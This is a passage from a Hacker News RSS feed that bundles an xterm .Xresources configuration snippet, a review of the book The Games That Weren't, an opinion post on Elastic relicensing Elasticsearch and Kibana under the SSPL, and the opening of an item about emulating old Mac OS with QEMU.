<p>As with most X applications, xterm can be customized via global X resources files (e.g. <code>/usr/lib/X11/app-defaults/XTerm</code>), per-user resource files (e.g. <code>~/.Xresources</code>), or command-line arguments. Most of the command-line options correspond to resource settings, as noted in the <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a>.</p>

<p>While the name of the program is xterm, the X resource class in <code>~/.Xresources</code> is <code>XTerm</code>, e.g.:</p>

<pre>XTerm*utf8: 1</pre>

<p>The <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a> provides a full list of features and options.</p>

<p>xterm is still being actively developed, it works really great across many different systems, it has extremely low input latency, it has many hidden gems and it is my favorite terminal emulator! For that reason I'm going to share some settings you can use in your <code>~/.Xresources</code> file:</p>

<pre>XTerm*faceName: "DejaVu Sans Mono"
XTerm*faceSize: 12
XTerm*renderFont: true
! Dynamically change font size with CTRL+SHIFT+PageUp/PageDown
XTerm*faceSize1: 12
XTerm*faceSize2: 14
XTerm*faceSize3: 16
XTerm*faceSize4: 18
XTerm*faceSize5: 20
XTerm*faceSize6: 22
XTerm*utf8: 1
XTerm*termName: xterm-256color
XTerm*borderWidth: 0
XTerm*autohint: true
XTerm*backarrowKey: false
XTerm*bellIsUrgent: false
XTerm*cursorBlink: false
XTerm*ScrollKey: true
! Fix ALT key (check in mc with Alt+h)
XTerm*metaSendsEscape: true
XTerm*eightBitInput: false
XTerm*ttyModes: erase ^?
XTerm*fastScroll: true

! I like a lot of scrollback.
XTerm*saveLines: 100000

! Use CLIPBOARD by default.
XTerm*selectToClipboard: true
! Hack xterm to add selection to both PRIMARY and CLIPBOARD.
&lt;Btn1Up&gt;: select-end(PRIMARY, CLIPBOARD, CUT_BUFFER0)

! xterm defines a whole suite of …</pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html">https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html</a></em></p>]]>
            </description>
            <link>https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788858</guid>
            <pubDate>Fri, 15 Jan 2021 09:44:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Games That Weren’t]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25788647">thread link</a>) | @rbanffy
<br/>
January 15, 2021 | https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/ | <a href="https://web.archive.org/web/*/https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1547">
	
	<div>
		
<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for “the first ever computer cartoon” – Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon’s Lair might look like… which, the following year, we’d find out was more or less the case!</p>



<figure><img data-attachment-id="1537" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2381/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg" data-orig-size="2863,3817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610281833&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;320&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2381" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=113 113w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy’s aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said “despite what you’ve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,” but towards the end of the article also says that it won’t be in the “heavily advertised” form because there wasn’t enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>



<figure><img data-attachment-id="1538" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/scooby-doo-180901-180209/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg" data-orig-size="960,720" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="scooby doo-180901-180209" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=960" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg 960w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=768 768w" sizes="(max-width: 960px) 100vw, 960px"></figure>



<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been… And I would have gotten away with it too, if it weren’t for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that’s the tale of my very first encounter with a game that weren’t. Wasn’t!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren’t, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>



<figure><img data-attachment-id="1539" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2341/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg" data-orig-size="2579,3439" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936167&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.025&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2341" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=112 112w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>As someone that writes about games from time to time, I think I’m qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it’s clearly an absolute labour of love, much like Frank’s website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it’s visually stunning – even more so than Scooby Doo in the Castle Mystery! And then you realise that it’s so much more than that…</p>



<figure><img data-attachment-id="1540" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2343/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg" data-orig-size="3548,2661" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936217&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0090909090909091&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2343" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren’t, and they weren’t for myriad reasons that all get unravelled here – flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K… Actually, I should say that Scooby Doo in the Castle Mystery didn’t make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>



<figure><img data-attachment-id="1541" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2344/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg" data-orig-size="3817,2863" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936289&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.012658227848101&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2344" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank’s decades-long obsession with investigating these mysteries – that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I’ve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren’t includes a load of development assets, screenshots, photos and artistic impressions – all reproduced in the very highest quality and sometimes for the first time – to illustrate the wonderfully in-depth analysis on each game.</p>



<figure><img data-attachment-id="1542" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2345/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg" data-orig-size="3746,2810" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936335&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.013698630136986&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2345" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before we analyse that analysis, let’s quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn’t know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that’s why we’ll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it’s available to play or not… And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there’s an awful lot more that you probably won’t know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There’s unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There’s all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk’s Shred Session. And then there’s the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja…</p>



<figure><img data-attachment-id="1543" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2346/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg" data-orig-size="3637,2728" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936363&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2346" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy’s Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you’re getting here! It starts with a title screen summarising the reason it weren’t – cartridge costs in this case – then the year it weren’t (2000), the developer, the platform and whether or not it’s available to play. Then we get some background history – why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren’t available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project’s technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse’s mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren’t too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn’t like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger’s fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there’s some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>



<figure><img data-attachment-id="1546" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2384/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg" data-orig-size="3884,2913" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610461038&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2384" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we’ve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that’s all for just one of the eighty games!</p>



<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets – though an awful lot of them do – but regardless, you can see the care, attention and passion that’s gone into every single feature on every single game. And all of this this is complemented by five purpose-built “Hardware That Wasn’t” blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>



<figure><img data-attachment-id="1544" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2348/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg" data-orig-size="3729,2797" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936477&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0099009900990099&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2348" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I flick through the book to make sure I haven’t forgotten anything, I’m so tempted just to keep going here! I happened to stop on Solar Jetman, where a wonderful …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</a></em></p>]]>
            </description>
            <link>https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788647</guid>
            <pubDate>Fri, 15 Jan 2021 09:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch and Kibana are now business risks]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788620">thread link</a>) | @dberhane
<br/>
January 15, 2021 | https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09 | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2021-01-14T00:00:00-08:00">January 14, 2021</time></p>
          
          
            <p> 




  4 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

<blockquote>
  <p>For more information on relicensing moves like this, please see <a href="https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">The problem with Amazon and Open Source isn’t Amazon</a>.</p>
</blockquote>

<hr>

<blockquote>
  <p>Judging from the bandwidth usage stats on my hosting service, people seem to appreciate this post. Thank you for that. If you’d like me to provide corporate open source strategy for your company, please <a href="https://www.vmbrasseur.com/about/#contact">drop me an email</a>. I’ll soon be kicking my job search into high gear after <a href="https://anonymoushash.vmbrasseur.com/2020/06/01/farewell-juniper">Juniper laid off its open source team</a> last year. Contacting me now makes it more likely your company will be in consideration for my next role.</p>
</blockquote>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788620</guid>
            <pubDate>Fri, 15 Jan 2021 09:08:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Mac OS 9 and Mac OS X 10.0 – 10.4 on Apple Silicon (M1) & Intel via QEMU]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788542">thread link</a>) | @miles
<br/>
January 15, 2021 | http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html | <a href="https://web.archive.org/web/*/http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html">archive.org</a>
